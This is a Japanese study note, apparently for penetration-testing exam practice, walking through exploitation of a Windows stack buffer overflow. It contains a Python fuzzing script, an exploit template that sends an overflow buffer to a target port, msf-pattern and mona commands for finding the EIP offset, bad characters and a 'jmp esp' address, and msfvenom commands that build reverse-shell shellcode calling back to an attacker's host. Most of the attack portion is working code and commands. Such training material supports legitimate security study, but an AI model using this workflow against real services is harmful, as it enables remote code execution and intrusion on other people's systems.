# ***<span style="color:blue;">BOFで使用するツールやコマンド</span>***
- Immunity Debugger   
-- 主に使うデバッガ   
- msf系のコマンド    
-- EIPをコントロールする際やアセンブリを特定するために使用する   
```
$ msf-pattern_create -l 3000   
$ msf-pattern_offset -q xxxxxxxx   
$ msf-nasm_shell
```    
- mona   
-- badcharsを探したり特定の命令を探す際に使用する
# ***<span style="color:blue;">BOFの攻略手順</span>***
１　BOFを起こす   
２　EIPをコントロールする   
３　シェルコードに使えない文字(badchars)を特定する    
４　シェルコードにジャンプするために使う命令を探す    
５　シェルコードをmsfvenomで作成する     
６　シェルを獲得する    
# ***<span style="color:blue;">BOFを起こす</span>***
- 大量の文字列を送信してBOFを引き起こす   
-- 徐々に文字列を増やしながら調査を行う（EIPが41414141になる）
```
#!/usr/bin/env python3
# 指定のマシンIP, Portに対して、100文字ずつインクリメンタルにバッファ文字列を送信するスクリプト。
# サービスの入力値の受け取り方式次第では使えないケース(バッファ送信時点で接続が切れる等)がある。
# その場合は手動(e.g. msf-pattern_create –l 3000)で文字列を送ってBOFを起こす。

import socket
import sys
import time

ip = ""

port = 8080
timeout = 5
# 送信するbufferの前に付ける必要のある文字列を指定(e.g. "USER: " )
prefix = ""

string = prefix + "A" * 100

while True:
  try:
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
      s.settimeout(timeout)
      s.connect((ip, port))
      s.recv(1024)
      print("Fuzzing with {} bytes".format(len(string) - len(prefix)))
      s.send(bytes(string, "latin-1"))
      s.recv(1024)
  except:
    print("Fuzzing crashed at {} bytes".format(len(string) - len(prefix)))
    sys.exit(0)
  string += 100 * "A"
  time.sleep(1)
  ```
  # ***<span style="color:blue;">Exploitに使用するスクリプト</span>***
  ```
  import socket

ip = "MACHINE_IP"
# Machine Port
port = 8080

# 送信するbufferの前に付ける必要のある文字列を指定(e.g. "USER: " )
prefix = ""
# EIPのOffset
offset = 0
# BOFを起こすのに必要な文字列。変数offsetによって長さが変化。
overflow = "A" * offset
# (主に)jmp espのアドレス
retn = ""
# NOP(具体的な命令が無く、次のバイト列へ評価を滑らせる)
padding = "\x90" * 16
# shellcode 
# msfvenom –p windows/shell_reverse_tcp LHOST=<IP> LPORT=<port> EXITFUNC=thread –e x86/shikata_ga_nai –b “\x00\x0a” –f py –v payload
payload = ""
# 送信するbufferの後に付ける必要のある文字列を指定(e.g. "USER: " )
postfix = ""

buffer = prefix + overflow + retn + padding + payload + postfix

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

try:
  s.connect((ip, port))
  print("Sending evil buffer...")
  s.send(bytes(buffer + "\r\n", "latin-1"))
  print("Done!")
except:
  print("Could not connect.")
```
# ***<span style="color:blue;">EIPのコントロール</span>***
- msfのツールを使用して送信する文字列を作成   
```
$ msf-pattern_create -l 3000
```   
- デバッガでEIPの値を確認する   
-- 右上のRegistersにあるEIPの値   
- EIPの値を用いてoffsetを特定   
-- offsetはEIPをコントロールするのに必要な文字数   
```
$ msf-pattern_offset -q xxxxxxxx
```    
- Aをoffsetの数とBを4文字(4バイト)送信してEIPを確認   
-- EIPが42424242(BBBB)になっていれば成功
# ***<span style="color:blue;">badcharsの特定</span>***
- 01からffまでのbyte列を作成    
```
for x in range(1, 256):
	print("\\x" + "{:02x}".format(x), end='')
print()
```
- payloadにbyre列を入れてpocを実行してBOFを起こす   
- ESP→Follow in Dumpでスタックの状況を確認(左下)    
-- 数バイトずれている可能性もあるのでその場合は調整する   
- 正常に表示されていない文字を特定してメモする   
- メモしたbadcharsをbyte列から削除して繰り返す   
-- badcharsがなくなるまで   
# ***<span style="color:blue;">badcharsの特定(monaを使う)</span>***
- monaのワーキングフォルダを設定する   
```
!mona config -set workingfolder C:¥mona¥%p
```   
- monaを使って比較用のbyte列を作成する   
```
!mona bytearray -b "¥x00"
```   
- アドレスを指定してbyte列との比較を行う   
-- byte列が格納されはじめているアドレスを指定することに注意   
```
!mona compare -f C:¥mona¥<app>¥bytearray.bin -a <add>
```    
- 00以外の最初の文字をbadcharsとしてメモする   
-- badcaharsを除いた比較用byte列を再生成して繰り返す   
# ***<span style="color:blue;">悪用する命令を探す</span>***
- shelcodeにjmpすることができる命令を探す   
-- 基本的にはjmp espを探すことになる   
- 探したい命令のアセンブリを確認   
```
$ msf-nasm_shell
nasm > jmp esp
```   
- monaを使ってアプリにロードされているdllを確認   
```
!mona modules
```   
- monaを使ってjmp espのアドレスを探す   
```
!mona find -s "¥xff¥xe4" -m "<module>"
```
# ***<span style="color:blue;">シェルコードを作成する</span>***
- msfvenomを用いて作成   
```
$ msfvenom -p windows/shell_reverse_tcp LHOST=<IP LPORT=<port> EXITFUNC=thread -e x86/shikata_ga_nai -b "¥x00¥x0a" -f py -v shellcode
```   
- badcharsによってはshikata_ga_naiが使えないことがある   
-- エンコーダを指定せずに実行すると様々なエンコーダを使ってくれる    
- フォーマットはpythonかcがおすすめ    
- 変数の名前は任意
# ***<span style="color:blue;">シェルを獲得する</span>***
- 作成したPoCを実行してシェルを獲得する   
-- リスナーは別で起動して問題ない   
- PoC内にIPアドレスやポート番号を書くのか引数を使うのか   
-- IPアドレスは引数で渡してポート番号はPoC内に書くのがオススメ   
- シェルはアプリを動作させている権限で返ってくる   
-- ***<span style="color:red;">シェルを取ったらproof.txtとIPアドレスのクリーンショットを撮る</span>***
- 失敗しても焦らずbadcharsなどを再確認する   
--　デバッガを確認しながらどこでクラッシュしているのかを確認する